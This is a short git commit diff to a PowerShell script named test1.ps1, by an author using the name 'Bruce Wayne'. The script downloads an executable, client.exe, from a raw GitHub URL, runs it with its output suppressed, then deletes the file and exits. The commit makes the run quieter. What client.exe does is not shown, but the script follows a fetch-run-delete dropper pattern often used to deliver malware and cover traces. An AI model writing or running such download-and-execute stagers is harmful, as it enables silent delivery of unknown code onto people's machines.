4bab41c945e9387c183841eea01c1518f16c054c
Bruce Wayne <96730813+RavenCraftInitaitives@users.noreply.github.com>
2022-07-21 15:01:45 +0600

    Update test1.ps1

--- test1.ps1
+++ test1.ps1
@@ -1,4 +1,4 @@
-# test1 #
 Invoke-WebRequest 'https://raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/client.exe' -OutFile client.exe
-Start-Process '.\client.exe' -Wait
+.\client.exe | Out-Null
 Remove-Item .\client.exe
+exit
